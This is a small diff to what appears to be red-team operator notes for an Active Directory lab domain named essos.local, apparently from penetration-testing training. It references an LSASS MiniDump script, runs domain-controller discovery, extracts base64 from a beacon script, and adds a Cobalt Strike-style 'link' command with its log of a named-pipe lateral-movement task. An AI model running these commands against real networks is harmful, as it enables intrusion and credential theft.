@@ -19,3 +19,6 @@ https://github.com/chvancooten/OSEP-Code-Snippets/blob/main/MiniDump/MiniDump.ps
 nltest /dsgetdc:essos.local
 
 cat beacon_x64.ps1 | grep -oP "(?<=FromBase64String\(').*?(?='\))"
+
+link meereen.essos.local
+[12/02 13:51:02] [*] Tasked to link to \\meereen.essos.local\pipe\mojo.5688.8052.18389493978708887706
